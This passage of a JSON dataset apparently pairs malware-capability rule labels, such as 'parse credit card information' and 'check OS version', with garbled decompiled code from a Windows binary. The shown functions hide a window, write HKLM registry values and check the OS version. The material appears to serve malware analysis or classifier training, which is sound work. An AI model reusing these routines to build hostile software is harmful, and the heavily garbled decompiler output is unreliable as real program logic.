pcVar3[0x4bb148d3] = pcVar3[0x4bb148d3] + (uVar1 >> 8);\n    }\n    out(*unaff_ESI, uVar5);\ncode_r0x004023d8:\n    iVar4 = *(puVar7 + 0x10);\n    puVar6 = *(puVar7 + 0xc);\n    bVar9 = false;\n    if (iVar4 != 0) {\n        *(puVar7 + 8) = iVar4;\n        do {\n            piVar8 = arg_8h;\n            if ((bVar9 == iVar4 < 0) && (bVar9 != iVar4 < 0)) {\n                out(0xc4, iVar4);\n                piVar8 = arg_8h + 1;\n                *arg_8h = iVar4;\n            }\n            arg_8h = piVar8 + *puVar6;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            puVar6 = puVar6 + 1;\n            bVar9 = SBORROW4(*(puVar7 + 8), 1);\n            iVar4 = *(puVar7 + 8) + -1;\n            *(puVar7 + 8) = iVar4;\n        } while (iVar4 != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 808
    },
    "00401200": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004017dc) overlaps instruction at (ram,0x004017d9)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x0040178f)\n\nvoid fcn.00401200(void)\n\n{\n    uint8_t *puVar1;\n    char *pcVar2;\n    ushort uVar3;\n    char extraout_AH;\n    uint32_t uVar4;\n    ushort extraout_CX;\n    ushort extraout_CX_00;\n    ushort extraout_CX_01;\n    char cVar5;\n    int32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    uint32_t extraout_ECX_08;\n    ushort extraout_DX;\n    ushort extraout_DX_00;\n    ushort extraout_DX_01;\n    uint extraout_EDX;\n    uint32_t *puVar6;\n    uint extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    uint extraout_EDX_02;\n    uint extraout_EDX_03;\n    int32_t extraout_EDX_04;\n    uint32_t unaff_EBX;\n    uint32_t uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    int32_t *piVar13;\n    int32_t *piVar14;\n    uint *puVar15;\n    int32_t *piVar16;\n    int32_t *piVar17;\n    uint *puVar18;\n    uint *puVar19;\n    uint *puVar20;\n    uint uVar21;\n    int32_t iVar22;\n    uint *puVar23;\n    int32_t iVar24;\n    uint16_t uVar25;\n    uint unaff_EDI;\n    uint uVar26;\n    uint *puVar27;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    uchar uVar28;\n    bool bVar29;\n    uint8_t in_AF;\n    bool bVar30;\n    uchar uVar31;\n    char cVar32;\n    char cVar33;\n    unkbyte10 extraout_ST0;\n    ulong uVar34;\n    unkbyte6 Var35;\n    uint uStackY56;\n    uint uStackY52;\n    uint32_t uStackY48;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    \n    fcn.00404580(0x407014, 0xd, 0x424158, 10);\n    fcn.00404580(0x407014, 0xd, 0x424164, 0x12);\n    fcn.00404580(0x407014, 0xd, 0x424178, 4);\n    fcn.00404580(0x407014, 0xd, 0x42417c, 0xc);\n    uVar7 = (unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff;\n    fcn.00404580(0x407014, 0xd, 0x424188, 7);\n    fcn.00404580(0x407014, 0xd, 0x424190, 0xb);\n    bVar29 = (POPCOUNT(extraout_DX + (extraout_DX >> 8)) & 1U) == 0;\n    uVar34 = fcn.00404580(0x407014, 0xd, 0x42419c, 0xc);\n    uVar25 = unaff_EDI;\n    if ((bVar29) || (!bVar29)) {\n        unaff_EDI = 8;\n        in_stack_ffffffdc = 0x4241a8;\n        in_stack_ffffffd8 = 0xd;\n    }\n    uVar21 = *0x6a17b43a;\n    puVar1 = (uVar34 >> 0x20) + -0x57;\n    *puVar1 = *puVar1 | extraout_ECX >> 8;\n    pcVar2 = uVar34 + 0xe;\n    cVar32 = extraout_ECX + 1 >> 8;\n    cVar33 = SCARRY1(*pcVar2, cVar32);\n    *pcVar2 = *pcVar2 + cVar32;\n    cVar32 = *pcVar2 < '\\0';\n    uStackY48 = 0x401398;\n    uVar34 = fcn.00404580(0x407014, in_stack_ffffffd8, in_stack_ffffffdc, unaff_EDI);\n    iVar22 = uVar34;\n    uVar4 = extraout_ECX_00;\n    if (cVar33 == cVar32) {\n        uStackY48 = uStackY48 & 0xffff | extraout_ECX_00 << 0x10;\n        uVar4 = extraout_ECX_00 & 0xffff;\n        cVar5 = (extraout_ECX_00 << 0x10) >> 0x18;\n        if (cVar33 == cVar32) goto code_r0x004013ad;\n    }\n    else {\ncode_r0x004013ad:\n        cVar5 = uVar4 >> 8;\n        uStackY48 = 0xd;\n        uStackY52 = 0x4241b0;\n        uStackY56 = 0xd;\n    }\n    puVar10 = &stack0xffffffc8 ^ *(uVar7 + 0x6a);\n    pcVar2 = (uVar34 >> 0x20) + 0xd;\n    *pcVar2 = *pcVar2 + cVar5;\n    puVar10[-1] = 0x407014;\n    puVar10[-2] = 0x4013c0;\n    fcn.00404580(puVar10[-1], *puVar10, puVar10[1], puVar10[2]);\n    puVar10[10] = extraout_ECX_01;\n    puVar10[9] = extraout_EDX;\n    cVar33 = '\\0';\n    cVar32 = (extraout_EDX ^ (unaff_EBX & 0xffff) >> 8 | 0x67) < '\\0';\n    puVar10[10] = 0x18;\n    puVar10[9] = 0x4241c0;\n    puVar10[8] = 0xd;\n    puVar11 = puVar10 + 7;\n    puVar10[7] = 0x407014;\n    puVar10[6] = 0x4013e5;\n    uVar34 = fcn.00404580(puVar10[7], puVar10[8], puVar10[9], puVar10[10]);\n    puVar6 = uVar34 >> 0x20;\n    if ((cVar33 != cVar32) || (cVar33 == cVar32)) {\n        puVar11 = puVar10 + 6;\n        puVar10[6] = 0x25;\n    }\n    *(uVar34 + -0x7ce92414) = extraout_ST0;\n    puVar11[-1] = uVar7;\n    in_AF = 9 < (uVar34 - 1U & 0xf) | in_AF;\n    bVar29 = 0xda95207b < *puVar6;\n    *puVar6 = *puVar6 + 0x256adf84;\n    bVar30 = *puVar6 == 0;\n    puVar11[-2] = 0x4241d8;\n    puVar11[-3] = 0xd;\n    puVar12 = puVar11 + -4;\n    puVar11[-4] = 0x407014;\n    puVar11[-5] = 0x40140d;\n    uVar4 = fcn.00404580(puVar11[-4], puVar11[-3], puVar11[-2], puVar11[-1]);\n    if ((bVar30) || (!bVar30)) {\ncode_r0x00401421:\n        puVar11[-5] = 10;\n        puVar11[-6] = 0x424200;\n        puVar11[-7] = 0xd;\n        puVar11[-8] = 0x407014;\n        puVar11[-9] = 0x401434;\n        Var35 = fcn.00404580(puVar11[-8], puVar11[-7], puVar11[-6], puVar11[-5]);\n        *(puVar11 + 0xe) = Var35 >> 0x20;\n        *(puVar11 + 10) = Var35;\n        puVar11[3] = 0xc;\n        puVar11[2] = 0x42420c;\n        puVar11[1] = 0xd;\n        *puVar11 = 0x407014;\n        puVar11[-1] = 0x40145f;\n        fcn.00404580(*puVar11, puVar11[1], puVar11[2], puVar11[3]);\n        puVar11[3] = uVar7;\n        puVar12 = puVar11 + 2;\n        puVar11[2] = extraout_EDX_00;\n    }\n    else {\n        uVar7 = uVar7 + 1;\n        if (!bVar29 && uVar7 != 0) {\n            in_AF = 9 < (uVar4 & 0xf) | in_AF;\n            piVar17 = (uVar4 & 0xffff0000 | CONCAT11((uVar4 >> 8) + in_AF, uVar4 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar17 = *piVar17 - uVar7;\n            iVar22 = iVar22 + 1;\n            goto code_r0x00401421;\n        }\n    }\n    uVar8 = puVar12[1];\n    puVar12[1] = 0xd;\n    *puVar12 = 0x424218;\n    puVar12[-1] = 0xd;\n    puVar12[-2] = 0x407014;\n    puVar12[-3] = 0x401480;\n    fcn.00404580(puVar12[-2], puVar12[-1], *puVar12, puVar12[1]);\n    puVar12[1] = extraout_ECX_02;\n    bVar29 = (extraout_ECX_02 - 1U & uVar25 | 0x61be) == 0;\n    puVar12[1] = 6;\n    *puVar12 = 0x424228;\n    puVar12[-1] = 0xd;\n    piVar13 = puVar12 + -2;\n    puVar12[-2] = 0x407014;\n    puVar12[-3] = 0x4014a1;\n    fcn.00404580(puVar12[-2], puVar12[-1], *puVar12, puVar12[1]);\n    if ((bVar29) || (*(puVar12 + -10) = extraout_CX,  !bVar29)) {\n        piVar13 = puVar12 + -3;\n        puVar12[-3] = 5;\n    }\n    *(piVar13 + -1) = in_SS;\n    uVar26 = piVar13[-1];\n    piVar13[-1] = 0x47;\n    piVar13[-2] = 0x424230;\n    piVar13[-3] = 0xd;\n    piVar13[-4] = 0x407014;\n    piVar13[-5] = 0x4014c5;\n    uVar34 = fcn.00404580(piVar13[-4], piVar13[-3], piVar13[-2], piVar13[-1]);\n    piVar13[3] = uVar34;\n    piVar13[2] = extraout_ECX_03;\n    piVar13[1] = uVar34 >> 0x20;\n    *piVar13 = uVar8;\n    piVar13[-1] = piVar13 + 4;\n    piVar13[-2] = uVar21;\n    piVar13[-3] = iVar22;\n    piVar13[-4] = uVar26;\n    bVar29 = extraout_ECX_03 >> 8 == '\\x06';\n    uVar8 = piVar13[-3];\n    uVar21 = piVar13[-2];\n    iVar22 = *piVar13;\n    piVar13[3] = 0xd;\n    piVar13[2] = 0x424238;\n    piVar13[1] = 0xd;\n    *piVar13 = 0x407014;\n    piVar13[-1] = 0x4014f7;\n    fcn.00404580(*piVar13, piVar13[1], piVar13[2], piVar13[3]);\n    if ((bVar29) || (*(piVar13 + -2) = extraout_CX_00,  !bVar29)) {\n        piVar14 = piVar13 + -1;\n        piVar13 = piVar13 + -1;\n        *piVar14 = 0x19;\n    }\n    *(piVar13 + -1) = in_SS;\n    uVar26 = piVar13[-1];\n    piVar13[-1] = 0x47;\n    piVar13[-2] = 0x424248;\n    piVar13[-3] = 0xd;\n    piVar13[-4] = 0x407014;\n    piVar13[-5] = 0x40151b;\n    uVar3 = fcn.00404580(piVar13[-4], piVar13[-3], piVar13[-2], piVar13[-1]);\n    uVar28 = 0xffffffdf < piVar13 + -4;\n    *(piVar13 + 0xe) = uVar3;\n    *(piVar13 + 10) = extraout_ECX_04;\n    *(piVar13 + 6) = uVar8;\n    cVar32 = uVar3 + -1;\n    uVar31 = cVar32 == '\\0';\n    bVar29 = (POPCOUNT(cVar32) & 1U) == 0;\n    puVar23 = *(piVar13 + 6);\n    piVar13[3] = 0xf;\n    piVar13[2] = 0x424264;\n    piVar13[1] = 0xd;\n    *piVar13 = 0x407014;\n    piVar13[-1] = 0x40153b;\n    fcn.00404580(*piVar13, piVar13[1], piVar13[2], piVar13[3]);\n    if (bVar29) {\ncode_r0x00401552:\n        piVar13[-1] = 0xe;\n    }\n    else {\n        piVar13[-1] = uVar26;\n        uVar26 = piVar13[-1];\n        if (!bVar29) goto code_r0x00401552;\n        uVar28 = 0;\n        puVar23 = 0x34a96cf4;\n        uVar31 = extraout_EDX_01 == -1;\n        uVar21 = *0x6a17b43a;\n        *(piVar13 + -1) = in_CS;\n    }\n    piVar13[-2] = 0x424274;\n    piVar13[-3] = 0xd;\n    piVar13[-4] = 0x407014;\n    piVar13[-5] = 0x401565;\n    uVar34 = fcn.00404580(piVar13[-4], piVar13[-3], piVar13[-2], piVar13[-1]);\n    puVar15 = piVar13 + -4;\n    if ((!uVar31) && (puVar15 = piVar13 + -4,  uVar31)) {\n        iVar22 = iVar22 + 1;\n        if (uVar28 || iVar22 == 0) {\n            puVar15 = piVar13 + -5;\n            piVar13[-5] = uVar34 >> 0x20;\n        }\n        else {\n            in_AF = 9 < (uVar34 & 0xf) | in_AF;\n            piVar17 = (uVar34 & 0xffff0000 | CONCAT11((uVar34 >> 8) + in_AF, uVar34 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n            *piVar17 = *piVar17 - iVar22;\n            puVar23 = puVar23 + 1;\n            puVar15 = piVar13 + -4;\n        }\n    }\n    *(puVar15 + -4) = 0xb;\n    *(puVar15 + -8) = 0x424284;\n    *(puVar15 + -0xc) = 0xd;\n    *(puVar15 + -0x10) = 0x407014;\n    *(puVar15 + -0x14) = 0x40158c;\n    fcn.00404580(*(puVar15 + -0x10), *(puVar15 + -0xc), *(puVar15 + -8), *(puVar15 + -4));\n    *(puVar15 + 0x1c) = iVar22;\n    *(puVar15 + 0x1a) = extraout_CX_01;\n    uVar9 = *(puVar15 + 0x1c);\n    *(puVar15 + 0x1c) = 0xb;\n    *(puVar15 + 0x18) = 0x424290;\n    *(puVar15 + 0x14) = 0xd;\n    *(puVar15 + 0x10) = 0x407014;\n    *(puVar15 + 0xc) = 0x4015b7;\n    uVar3 = fcn.00404580(*(puVar15 + 0x10), *(puVar15 + 0x14), *(puVar15 + 0x18), *(puVar15 + 0x1c));\n    *(puVar15 + 0x1c) = uVar26;\n    *(puVar15 + 0x1a) = uVar3;\n    *(puVar15 + 0x18) = extraout_DX_00;\n    uVar8 = *(puVar15 + 0x1c);\n    *(puVar15 + 0x1c) = 0xb;\n    *(puVar15 + 0x18) = 0x42429c;\n    *(puVar15 + 0x14) = 0xd;\n    *(puVar15 + 0x10) = 0x407014;\n    *(puVar15 + 0xc) = 0x4015e4;\n    uVar3 = fcn.00404580(*(puVar15 + 0x10), *(puVar15 + 0x14), *(puVar15 + 0x18), *(puVar15 + 0x1c));\n    *(puVar15 + 0x1c) = uVar8;\n    *(puVar15 + 0x1a) = uVar3;\n    *(puVar15 + 0x18) = extraout_DX_01;\n    puVar27 = *(puVar15 + 0x1c);\n    *(puVar15 + 0x1c) = 10;\n    *(puVar15 + 0x18) = 0x4242a8;\n    *(puVar15 + 0x14) = 0xd;\n    *(puVar15 + 0x10) = 0x407014;\n    *(puVar15 + 0xc) = 0x401611;\n    uVar3 = fcn.00404580(*(puVar15 + 0x10), *(puVar15 + 0x14), *(puVar15 + 0x18), *(puVar15 + 0x1c));\n    *(puVar15 + 0x1c) = extraout_EDX_02;\n    *(puVar15 + 0x1a) = uVar3;\n    bVar29 = false;\n    *(puVar15 + 0x1c) = 0xc;\n    *(puVar15 + 0x18) = 0x4242b4;\n    *(puVar15 + 0x14) = 0xd;\n    piVar16 = puVar15 + 0x10;\n    *(puVar15 + 0x10) = 0x407014;\n    *(puVar15 + 0xc) = 0x401641;\n    fcn.00404580(*(puVar15 + 0x10), *(puVar15 + 0x14), *(puVar15 + 0x18), *(puVar15 + 0x1c));\n    uVar8 = extraout_ECX_05;\n    if (bVar29) {\ncode_r0x0040164f:\n        cVar32 = uVar8 >> 8;\n        *(puVar15 + 0xc) = 0xe;\n        *(puVar15 + 8) = 0x4242c0;\n        piVar16 = puVar15 + 4;\n        *(puVar15 + 4) = 0xd;\n    }\n    else {\n        *(puVar15 + 0xc) = extraout_ECX_05;\n        uVar8 = *(puVar15 + 0xc);\n        cVar32 = uVar8 >> 8;\n        if (!bVar29) goto code_r0x0040164f;\n    }\n    *puVar27 = *puVar23;\n    *0xc0680e79 = *0xc0680e79 + cVar32;\n    piVar16[-1] = 0x407014;\n    piVar16[-2] = 0x401662;\n    uVar8 = fcn.00404580(piVar16[-1], *piVar16, piVar16[1], piVar16[2]);\n    piVar16[6] = uVar8;\n    piVar16[6] = 0x11;\n    piVar16[5] = 0x4242d0;\n    piVar16[4] = 0xd;\n    piVar16[3] = 0x407014;\n    piVar16[2] = 0x401690;\n    uVar34 = fcn.00404580(piVar16[3], piVar16[4], piVar16[5], piVar16[6]);\n    piVar16[6] = uVar34;\n    piVar16[5] = extraout_ECX_06;\n    piVar16[4] = uVar34 >> 0x20;\n    piVar16[3] = uVar9;\n    piVar16[2] = piVar16 + 7;\n    piVar16[1] = uVar21;\n    *piVar16 = puVar23 + 1;\n    piVar16[-1] = puVar27 + 1;\n    uVar9 = piVar16[-1];\n    uVar26 = *piVar16;\n    uVar8 = piVar16[1];\n    uVar21 = piVar16[3];\n    piVar16[6] = 0x13;\n    piVar16[5] = 0x4242e4;\n    piVar16[4] = 0xd;\n    piVar16[3] = 0x407014;\n    piVar16[2] = 0x4016ad;\n    fcn.00404580(piVar16[3], piVar16[4], piVar16[5], piVar16[6]);\n    piVar16[2] = 0x14;\n    piVar16[1] = 0x4242f8;\n    *piVar16 = 0xd;\n    piVar16[-1] = 0x407014;\n    piVar16[-2] = 0x4016ce;\n    uVar34 = fcn.00404580(piVar16[-1], *piVar16, piVar16[1], piVar16[2]);\n    piVar16[6] = uVar34;\n    piVar16[5] = extraout_ECX_07;\n    piVar16[4] = uVar34 >> 0x20;\n    piVar16[3] = uVar21;\n    piVar16[2] = piVar16 + 7;\n    piVar16[1] = uVar8;\n    *piVar16 = uVar26;\n    piVar16[-1] = uVar9;\n    uVar21 = piVar16[-1];\n    iVar24 = *piVar16;\n    uVar7 = piVar16[1];\n    iVar22 = piVar16[3];\n    piVar16[6] = 0x33;\n    piVar16[5] = 0x42430c;\n    piVar16[4] = 0xd;\n    piVar16[3] = 0x407014;\n    piVar16[2] = 0x4016ec;\n    fcn.00404580(piVar16[3], piVar16[4], piVar16[5], piVar16[6]);\n    piVar16[6] = uVar21;\n    bVar29 = false;\n    bVar30 = (uVar21 | 0x2fff) - iVar22 == 0x7174;\n    uVar8 = piVar16[6];\n    piVar16[6] = 10;\n    piVar16[5] = 0x424340;\n    piVar16[4] = 0xd;\n    piVar16[3] = 0x407014;\n    piVar16[2] = 0x401725;\n    uVar21 = fcn.00404580(piVar16[3], piVar16[4], piVar16[5], piVar16[6]);\n    piVar17 = piVar16 + 3;\n    if ((!bVar29 && !bVar30) && (piVar16[2] = uVar21,  piVar17 = piVar16 + 3,  bVar29 || bVar30)) {\n        iVar24 = piVar16[3];\n        piVar17 = piVar16 + 0xf;\n    }\n    piVar17[-1] = 4;\n    piVar17[-2] = 0x42434c;\n    piVar17[-3] = 0xd;\n    piVar17[-4] = 0x407014;\n    piVar17[-5] = 0x40174f;\n    fcn.00404580(piVar17[-4], piVar17[-3], piVar17[-2], piVar17[-1]);\n    piVar17[3] = extraout_EDX_03;\n    cVar32 = extraout_EDX_03 + '\\x15';\n    cVar33 = SBORROW1(cVar32, extraout_AH);\n    cVar32 = cVar32 - extraout_AH < '\\0';\n    piVar17[3] = 5;\n    piVar17[2] = 0x424350;\n    piVar17[1] = 0xd;\n    *piVar17 = 0x407014;\n    piVar17[-1] = 0x40176f;\n    uVar28 = fcn.00404580(*piVar17, piVar17[1], piVar17[2], piVar17[3]);\n    if (cVar33 == cVar32) {\n        piVar17[-1] = uVar8;\n        if (cVar33 != cVar32) {\n            *piVar17 = in_ES;\n            iVar24 = iVar24 + -1;\n            *(piVar17[-1] | uVar7) = uVar28;\n            cVar33 = '\\0';\n            cVar32 = '\\0';\n        }\n    }\n    piVar17[-1] = 6;\n    piVar17[-2] = 0x424358;\n    piVar17[-3] = 0xd;\n    puVar18 = piVar17 + -4;\n    piVar17[-4] = 0x407014;\n    piVar17[-5] = 0x40179d;\n    fcn.00404580(piVar17[-4], piVar17[-3], piVar17[-2], piVar17[-1]);\n    uVar7 = extraout_ECX_08;\n    if (cVar33 == cVar32) {\n        *(piVar17 + -0x12) = extraout_ECX_08;\n        uVar7 = *(piVar17 + -0x12);\n        cVar5 = uVar7 >> 8;\n        if (cVar33 != cVar32) goto code_r0x004017af;\n    }\n    cVar5 = uVar7 >> 8;\n    piVar17[-5] = 0x2a;\n    piVar17[-6] = 0x42438c;\n    puVar18 = piVar17 + -7;\n    piVar17[-7] = 0xd;\ncode_r0x004017af:\n    puVar19 = puVar18 ^ *(iVar22 + 0x6a);\n    cVar5 = cVar5 - *(iVar24 + -0x74);\n    pcVar2 = extraout_EDX_04 + 0xe;\n    bVar29 = SCARRY1(*pcVar2, cVar5);\n    *pcVar2 = *pcVar2 + cVar5;\n    puVar20 = puVar19 + -1;\n    puVar19[-1] = 0x407014;\n    puVar19[-2] = 0x4017c5;\n    fcn.00404580(puVar19[-1], *puVar19, puVar19[1], puVar19[2]);\n    if ((bVar29) || (!bVar29)) {\n        puVar20 = puVar19 + -2;\n        puVar19[-2] = 0xb;\n    }\n    puVar20[-1] = 0x4243b8;\n    puVar20[-2] = 0xd;\n    puVar20[-3] = 0x407014;\n    puVar20[-4] = 0x4017ef;\n    fcn.00404580(puVar20[-3], puVar20[-2], puVar20[-1], *puVar20);\n    return;\n}\n",
        "token_count": 6906
    },
    "004029e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a3c) overlaps instruction at (ram,0x00402a38)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.004029e0(void)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    ushort in_ES;\n    bool bVar3;\n    uint lpVersionInformation;\n    uint32_t var_90h;\n    uint var_8ch;\n    \n    puVar2 = &stack0xfffffffc;\n    lpVersionInformation = 0x94;\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((var_90h < 6) || (5 < var_90h)) {\n        bVar3 = var_90h == 6;\n    }\n    else {\n        bVar3 = true;\n        *unaff_EDI = *unaff_ESI;\n        puVar2 = 0xffffff70;\n        *(iVar1 + -4) = in_ES;\n    }\n    if ((bVar3) && (*(puVar2 + -0x8c) == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 301
    },
    "null": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00403060": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403060(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 96
    },
    "00403c20": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403c7f) overlaps instruction at (ram,0x00403c7e)\n// \n\nuint32_t __cdecl fcn.00403c20(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint uVar2;\n    uint extraout_ECX_00;\n    uint32_t **unaff_ESI;\n    uint32_t unaff_EDI;\n    bool bVar3;\n    bool bVar4;\n    bool bVar5;\n    ulong uVar6;\n    uint32_t *puStack40;\n    uint32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = arg_8h;\n    uVar6 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    puStack40 = uVar6;\n    bVar5 = SCARRY4(&puStack40, 4);\n    bVar4 = &stack0xffffffdc < 0;\n    bVar3 = *0x10 == 0x24;\n    if (&puStack40 < 0xfffffffc) {\n        if (&puStack40 >= 0xfffffffc) {\n            if (&stack0xffffffdc < *puStack40 || puStack40 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            return uVar6 >> 0x20 & 0xffffff00 | puStack40 == 0x6;\n        }\n    }\n    var_14h = 0x424574;\n    var_10h = 0x42456c;\n    var_ch = 0x42457c;\n    var_8h = 0x424584;\n    var_4h = 0x42458c;\n    uVar2 = extraout_ECX;\n    if (!bVar3 && bVar5 == bVar4) {\n        while (bVar3 || bVar5 != bVar4) {\n            while( true ) {\n                arg_8h = arg_8h + 1;\n                *(puStack40 + 0x3339da56) = *(puStack40 + 0x3339da56) ^ uVar2;\n                puStack40 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n                if (puStack40 != NULL) {\n                    return 1;\n                }\n                unaff_EDI = unaff_EDI + 1;\n                unaff_ESI = unaff_ESI + 1;\n                uVar2 = extraout_ECX_00;\n                if (4 < unaff_EDI) break;\ncode_r0x00403c95:\n                puStack40 = *unaff_ESI;\n            }\n            if (unaff_EDI < 6) {\ncode_r0x00403cd1:\n                puStack40 = 0x424564;\n                iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(arg_8h);\n                return iVar1 == 0;\n            }\n            if (5 < unaff_EDI) goto code_r0x00403cd1;\n            if (!SBORROW4(unaff_EDI, 5)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            bVar5 = SCARRY1(pe_dos_header, '\\0');\n            bVar4 = pe_dos_header < '\\0';\n            bVar3 = pe_dos_header == 0x0;\n        }\n    }\n    unaff_EDI = 0;\n    unaff_ESI = &var_14h;\n    goto code_r0x00403c95;\n}\n",
        "token_count": 834
    },
    "00404720": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404806) overlaps instruction at (ram,0x00404805)\n// \n// WARNING: Removing unreachable block (ram,0x0040478b)\n// WARNING: Removing unreachable block (ram,0x00404806)\n// WARNING: Removing unreachable block (ram,0x00404790)\n\nuint fcn.00404720(char *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar uStack616;\n    uint uStack615;\n    char cStack356;\n    uint uStack355;\n    uint auStack96 [5];\n    int32_t aiStack76 [5];\n    uint auStack56 [5];\n    char *apcStack36 [5];\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    uStack616 = 0;\n    puVar5 = &uStack615;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    cStack356 = '\\0';\n    puVar5 = &uStack355;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    uStack16 = 1;\n    uStack8 = 0;\n    uStack12 = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&cStack356, 0x4241c0, param_1);\n    (*pcVar2)(&uStack616, 0x4241d8, param_1);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    apcStack36[0] = &cStack356;\n    apcStack36[2] = &uStack16;\n    apcStack36[3] = &uStack8;\n    apcStack36[4] = &uStack12;\n    uVar4 = 0xffffffff;\n    pcVar6 = &cStack356;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    aiStack76[0] = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = param_1;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    auStack56[0] = 0x424200;\n    auStack56[1] = 0x42420c;\n    auStack56[2] = 0x424218;\n    auStack56[3] = 0x424228;\n    auStack56[4] = 0x424230;\n    auStack96[0] = 2;\n    auStack96[1] = 1;\n    auStack96[2] = 4;\n    auStack96[3] = 4;\n    auStack96[4] = 4;\n    apcStack36[1] = param_1;\n    aiStack76[1] = ~uVar4 - 1;\n    aiStack76[2] = 4;\n    aiStack76[3] = 4;\n    aiStack76[4] = 4;\n    if ((param_2 != 0) < 5) {\n        uVar4 = (param_2 != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &uStack616, *(auStack56 + uVar4), *(auStack96 + uVar4), *(apcStack36 + uVar4)\n                              , *(aiStack76 + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1068
    },
    "00401b70": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401cef) overlaps instruction at (ram,0x00401ced)\n// \n\nvoid fcn.00401b70(void)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint8_t extraout_CH;\n    char extraout_CH_00;\n    uint16_t extraout_CX;\n    char extraout_CH_01;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int16_t unaff_BP;\n    uchar uVar3;\n    bool bVar4;\n    uint32_t in_stack_ffffffb7;\n    uint in_stack_ffffffbb;\n    uchar in_stack_ffffffbf;\n    uint uVar5;\n    uchar uVar6;\n    unkbyte3 Var7;\n    uint ptr;\n    uchar uVar8;\n    uchar uVar9;\n    uchar uVar10;\n    uchar uVar11;\n    uchar uVar12;\n    \n    fcn.00404580(0x407014, 0xd, 0x4244c0, 0x20);\n    uVar8 = 0;\n    Var7 = 0x4244e0;\n    uVar6 = 0;\n    uVar5 = 0xd00;\n    fcn.00404580(0x407014, 0xd, 0x4244e0, 